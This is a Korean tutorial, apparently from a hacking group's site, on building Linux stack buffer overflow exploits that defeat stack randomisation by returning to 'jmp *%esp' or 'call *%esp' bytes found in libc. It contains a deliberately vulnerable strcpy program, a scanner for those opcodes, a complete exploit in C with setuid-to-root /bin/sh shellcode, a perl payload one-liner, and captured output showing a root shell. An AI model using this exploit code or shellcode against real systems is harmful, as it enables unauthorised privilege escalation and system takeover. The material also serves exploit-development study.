@@ -1,0 +1,359 @@
+             
+                Jmp *%esp, Call *%esp 를 이용한 Buffer Overflow Exploit 제작
+             
+                                     Mutacker in (주서식지: Null@Root & 항공대 네트웍 보안연구실 )
+                                                  mutacker@null2root.org, 
+                                                  mutacker@mail.hangkong.ac.kr
+                                                  (http://mutacker.null2root.org)
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+/////// 1. 글 쓰기에 앞서
+
+먼저 글 쓰기에 앞서 항상 저를 도와주시는 많은 분들에게 감사드립니다.
+이하 존칭 생략.. 죄송합니다. __)
+
+해킹의 새로운 기술이나 기법을 발견하고 생각해 내는 작업은 분명 혼자서 해나가기에는 지치고 힘이 들 때가 많다. 
+하지만, 항상 곁에서 지켜봐주고, 도와주고 조언을 아끼지 않는 수많은 분들이 있기에 가능한 일이 아닌가 싶다.
+다시 한번 그 분들에게 감사를 표한다.
+
+특히, 우리의 "오~ 모나리자(O~ MuNaRiSe)"팀원(?)들께 감사드립니다. - 정체불명의 Null@Root 멤버들
+
+이 문서는 다양한 방법의 소개에 해당하는 것으로 버퍼오버플로어 기법이 어디까지 응용이 가능한지 보여주기 위함일 
+뿐이다.
+
+본 문서에 대한 판권은 없는 것으로 하며, 단지 편집만은 금했으면 한다.
+틀린 부분이나 오탈자 등은 본인에게 메일이나 주서식지(irc.null2root.org)에서 알려주시기 바랍니다.
+단지 본 문서에서는 방향만을 제시할 뿐 실제 특정 어플리케이션에 관련된 exploit을 제공하지는 않는다.
+아무쪼록, 이 글이 한국 보안 전문가들이나 열심히 노력하는(? 뚫기위해가 아닌 기술발전을 위해) 해커들에게,
+그리고 프로그램을 개발하는 개발자들에게 조그마한 도움이 되었으면 하는 바램에서 글을 적어본다.
+
+이 문서의 최고 공개지는 http://www.null2root.org이며, 최초 문서 개제 장소는 http://www.khdp.org이다.
+만일 다른 곳에 본 문서를 개제할 경우에는 그 출처를 정확히 밝혀주었으면 하는 바램이다.
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+/////// 2. 소개
+
+2003년 10월 14일, 우연히 http://www.cnhonker.com 사이트를 방문하게 되었고, 아주 재미난 글을 볼 수 있었다.
+Redhat 9.0에 추가된 Stack영역의 Random 주소 부여 방식에 대해 그것을 무용지물(??)로 만들 수 있는 방안이기도 하다.
+
+이 글은 본인이 중국어를 할 줄 모르는 관계로 해당 글의 내용에 나타나는 코드를 보고 재구성한 내용임을 밝혀둔다.
+
+Source : http://www.cnhonker.com/index.php?module=articles&act=view&type=7&id=51
+Thanks, bkbll
+
+원 글에서의 내용을 기준으로 Wowlinux 7.3계열에서 테스트 했을 때, jmp *%esp코드를 전혀 발견할 수 없었다.
+그렇다면 정말 여기에서는 이것을 이용할 수 없는 것인가? 하는 생각에 이르게 되었고, 
+이를 해결하기 위한 또다른 방안이 존재할 수도 있음을 알았다.
+이를 위해 해당 문서에서는 소개되지 못하고 있는 call *%esp에 대한 간략한 소개도 이루어 질 것이다.
+
+본 문서에서는 원 저자의 코드를 가급적 그대로 이용하겠다.
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 3. 문제 설정
+
+[netconf@linux1 test]$ cat vul.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int foo(char *s1)
+{
+    char buffer[20];
+    memset(buffer,0,20);
+    strcpy(buffer,s1);
+    printf("input:%s\r\n",buffer);
+    return 0;
+}
+
+main(int argc,char **argv)
+{
+
+    if(argc<2)
+    {
+        printf("Usage:%s <string>\n",argv[0]);
+        exit(0);
+    }
+    foo(argv[1]);
+    exit(0);
+}
+
+직관적으로 stack buffer overflow가 가능한 코드임을 알 수 있다.
+물론 환경 변수 영역을 이용해서 쉘을 올릴 수 있겠지만, 여기에서는 리모트 공격도 고려하자.
+
+우리는 쉽게 아래와 같은 형태의 그림을 머리속으로 그릴 수 있을 것이다.
+
+             |                                 |
+             +---------------------------------+
+             |         Return Address          |---+
+             +---------------------------------+   |
+             |                                 |<--+
+             |                                 |   
+             |         shell code              |   
+             |                                 |
+             |                                 |
+             +---------------------------------+
+             |                                 |
+헌데, 만일 Redhat 9.0과 같은 Stack 영역의 주소가 프로그램을 수행할 때마다 Random하게 변경되는 
+상황이라면 shellcode의 위치를 찾는다는 것은 쉬운 일은 아닐 것이다.
+물론 쉘코드의 양을 상당히 큰 크기로 키워 Exploit을 제작할 수도 있겠지만, 입력데이터의 한계가
+주어진다면 이 또한 어려워진다.
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 4. 문제 분석과 해결
+
+원저자는 여기에서 다음과 같은 코드를 선보였다.
+
+// 원본과 약간 수정된 부분은 p값을 입력받는 부분을 외부에서 입력할 수 있도록 하였다.
+[netconf@linux1 test]$ cat findesp.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+unsigned int i=0;
+unsigned int a=0;
+unsigned char *p;
+
+void de(int j)
+{
+        printf("\r\nGot SIGSEGV:");
+        printf("%p\r\n",p+a);
+        a++;
+        exit(0);
+}
+
+main(int argc, char* argv[])
+{
+        if(argc < 2) {
+                printf("%s <start address for searching 0xffe4>\n", argv[0]);
+                exit(0);
+        }
+
+        sscanf(argv[1], "%x", &i);
+        printf("Using %x\n", i);
+
+        p=(unsigned char *)i;
+        signal(SIGSEGV,de);
+        foo();
+}
+
+int foo()
+{
+        while((unsigned int)p+a < 0xbfffffff) {
+                fflush(stdout);
+                if( (*(p+a)==0xff) && (*(p+a+1)==0xe4) ) {
+                        printf("found it!! addr:%p\n",p+a);
+                        a+=2;
+                        foo();
+                }
+                a++;
+        }
+        exit(0);
+}
+
+이 코드는 자신이 원하는 곳에서 0xff와 0xe4가 연속해서 존재하는 메모리 공간의 위치값을
+화면에 출력해 주는 프로그램이다. 이 두 개의 숫자는 jmp *%esp 에 해당하는 명령어이다.
+즉, 현재 %esp가 가리키는 곳으로 jump하라는 의미가 되겠다.
+
+이전에 본인이 작성했었던 문서들에서 함수가 리턴되는 시점에서의 %esp 레지스터의 움직임에 대해
+자세하게 언급한 바가 있으므로 여기에서는 간단하게 설명하도록 하겠다.
+ret 가 실행되는 시점에서 %eip레지스터의 값은 %esp가 가리키는 곳에서 취하게 된다.
+ret가 실행되면 %esp값은 4만큼이 증가되어진다. 
+만일 여기에서 ret에 의해 return 되는 주소가가 jmp *%esp (xff와 0xe4가 연속해서 존재하는 메모리 공간)이면
+%esp가 가리키는 곳으로 다시 점프해 올 것이다.
+
+             |                                 |
+             +---------------------------------+
+             |         Return Address          |-----------------> jmp *%esp (0xff 0xe4) --+
+             +---------------------------------+                                           | 
+             |                                 |<------------------------------------------+
+             |                                 |   
+             |         shell code              |   
+             |                                 |
+             |                                 |
+             +---------------------------------+
+             |                                 |
+
+이 방법을 이용하게 될 경우 우리는 %esp의 위치값을 알려고 노력할 필요가 없어진다. 
+기계적으로 정확한 %esp의 값을 획득하여 쉘코드를 실행시킬수 있는 장점이 생기는 것이다.
+
+==========================================================================
+원저자의 경우 저 코드를 라이브러리 영역에서 찾고 있다.
+#include <signal.h>
+unsigned int i=0x4211cc79;  // <== 라이브러리 영역
+unsigned int a=0;
+==========================================================================
+
+[netconf@linux1 test]$ ./findesp
+found it!!,p addr:0x4211ccf7
+found it!!,p addr:0x4211dd5b
+found it!!,p addr:0x4211dee7
+found it!!,p addr:0x4211e15f
+found it!!,p addr:0x4211e59f
+found it!!,p addr:0x42125aa3
+found it!!,p addr:0x42125c13
+
+Got SIGSEGV:0x4212f000
+
+원저자의 경우 0xff 0xe4 를 가진 곳이 위와 같은 곳임을 알 수 있으며,
+아래의 #define JMPESP 0x42125aa3 에는 위에서 아무 것이나 하나를 선택하였음을 알 수 있다.
+
+[netconf@linux1 test]$ cat exp.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+#include <error.h>
+
+#define JMPESP 0x42125aa3
+
+char progname[]="./vul";
+char shellcode[]= "\x31\xdb\x31\xc9\x31\xd2\x31\xc0\xb0\xa4\xcd\x80"
+                  "\x89\xd8\xb0\x17\xcd\x80"
+                  "\x31\xc0\x50\x50\xb0\xb5\xcd\x80"
+                  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+                  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+                  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+main(int argc,char **argv)
+{
+    char buffer[1024];
+    int num=44,i=0;
+
+    memset(buffer,0,1024);
+    memset(buffer,'A',num);
+    buffer[num++]=JMPESP & 0xff;
+    buffer[num++]=(JMPESP>>8) & 0xff;
+    buffer[num++]=(JMPESP>>16) & 0xff;
+    buffer[num++]=(JMPESP>>24) & 0xff;
+    memcpy(buffer+num,shellcode,sizeof(shellcode));
+    execl(progname,progname,buffer,NULL);
+}
+
+[netconf@linux1 test]$ ./exp
+……………………
+. ?1???????/bin/sh
+sh-2.05b#
+
+정말 깔끔하다. 쉘을 이렇게 쉽게 띄웠다.
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 5. 문제점 지적
+
+만일 그렇다면 jmp *%esp 코드를 라이브러리 영역이든 코드영역이든 그 어디에서도 찾을 수 없다면
+위의 방식을 이용할 수없는 것인가?
+[muda@muda]$ cat /etc/redhat-release
+Red Hat Linux release 7.3 (Valhalla)
+
+[muda@muda]$ ./findesp 0x42000000
+Using 42000000
+
+Got SIGSEGV:0x42135000
+[muda@muda]$ ./findesp 0x40000000
+Using 40000000
+
+Got SIGSEGV:0x40015000
+[muda@shimcity muda]$
+
+애석하게도 위의 버젼에서는 그 어디에도 jmp *%esp코드를 발견할 수 없었다.
+여기에서 우리는 jmp *%esp에 준하는 다른 무조건 점프 명령을 생각해 볼 수 있겠다. 
+call *%esp가 아마 가장 유용하게 사용할 만한 무조건 점프 명령이 되지 않을까 싶어 테스트를 해보았다.
+참고로 0xff 0xd4가 call *%esp 이다.
+
+[muda@muda]$ ./findesp 0x40000000
+Using 40000000
+
+Got SIGSEGV:0x40015000
+[muda@muda]$ ./findesp 0x42000000
+Using 42000000
+found it!! addr:0x420312b6
+found it!! addr:0x4203dc96
+found it!! addr:0x420922f1
+found it!! addr:0x4209f9c1
+found it!! addr:0x42119f20
+
+Got SIGSEGV:0x42135000
+[muda@muda]$
+
+이중에서 0x4203dc96을 선택하여 (나머지는 모두 동작하지 않았다.) 실험해 보았다.
+
+[muda@muda]$ ./vul `perl -e 'print "A"x44, "\x96\xdc\x03\x42", "\x31\x
+db\x31\xc9\x31\xd2\x31\xc0\xb0\xa4\xcd\x80", "\x89\xd8\xb0\x17\xcd\x80", "\x31\
+xc0\x50\x50\xb0\xb5\xcd\x80","\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\
+x46\x0c\xb0\x0b", "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x3h-2.05a$
+
+어떤가?
+쉘이 실행됨을 볼 수 있다. 헌데, 나머지는 실행이 되지 않는다. 왜일까?
+이유는 단순하다. jmp *%esp의 경우에는 그냥 곧바로 점프를 하지만, call의 경우에는 
+call 다음의 명령어의 주소값이 스택에 들어가기 때문이다.
+즉, call *%esp가 0xff 0xd4이므로, 원래 return 주소로 들어간 주소 + 2의 위치값이 
+기존 return 주소 공간에 들어갈 것이다. (gdb로 테스트해보길 권한다.)
+만일 0x4203dc96을 위와같이 설정했다면 0x4203dc98이 리턴 주소로 들어갈 것이다. 
+그리고 %esp값은 -4만큼의 이동하게 된다.
+그리고, 그 리턴 주소가 있던 공간으로 call문에 의해 점프되어 올 것이다.
+즉, Return Address에 있는 값을 더 이상 주소로 보지 않고 명령어로 간주한다는 것이다.
+
+             |                                 |
+             +---------------------------------+
+             |         Return Address          | <----+    --------> call *%esp (0xff 0xe4) --+
+             +---------------------------------+      |                                       | 
+             |                                 |      +---------------------------------------+
+             |                                 |   
+             |         shell code              |   
+             |                                 |
+             |                                 |
+             +---------------------------------+
+             |                                 |
+
+그렇다면, Return Address로 들어가는 주소가 만일 기계어코드로만 인식될수만 있다면, 
+우리는 그곳으로 점프되더라도 별 무리는 없어보인다. 
+call에 의해 Return Address에 들어가 있는 0x4203dc98은 어떤 코드일까?
+
+[muda@muda]$ cat ttt.c
+char *buf = "\x98\xdc\x03\x42";
+char buff[100] = {0, };
+main() {
+     strcat(buff, buf);
+     strcat(buff, "AAAAAAA");
+
+     printf("buf=%p\n", buff);
+     printf("\n");
+}
+
+[muda@muda]$ gdb ttt -q
+(gdb) b *(main+86)
+Breakpoint 1 at 0x8048496
+(gdb) r
+Starting program: /home/muda/ttt
+buf=0x8049560
+
+
+Breakpoint 1, 0x08048496 in main ()
+(gdb) disassemble 0x8049560
+Dump of assembler code for function buff:
+0x8049560 <buff>:       cwtl
+0x8049561 <buff+1>:     faddl  (%ebx)
+0x8049563 <buff+3>:     inc    %edx
+
+다행히도(??) 0x4203dc98은 프로그램에 크게 영향을 주지 않는 기계어 코드임을 알 수 있다.
+
+즉, call *%esp의 위치값을 찾고, 그 위치값 + 2에 해당하는 주소가 기계어 명령어로 합당한 
+것이라면 jmp *%esp가 존재하지 않는 시스템에서 call *%esp를 이용 할 수 있음을 알 수 있다.
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 5. 결론
+
+본 문서에서는 jmp *%esp와 call *%esp를 이용한 exploit의 제작 방법에 대해 알아 보았다.
+이 들을 사용함으로써, 기준에 %esp의 값의 위치를 추적하고 하는 일들을 상당부분 줄일 수 있고,
+스택에 대해 랜덤 주소 부여 방식을 사용하는 시스템에 대해서도 충분히 쉽게 exploit을 제작할 수
+있는 방안이 될 수 있음을 살펴보았다.
+
+이제 우리에게 남은 것은 또 다른 무언가를 찾아 떠나는 일이 아닐까 싶다. 
+그럼 여러분들의 건승을 빌면서.. 
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 6. 참고문서
+
+1. 利用jmp esp ?行shellcode
+   http://www.cnhonker.com/index.php?module=articles&act=view&type=7&id=51
+
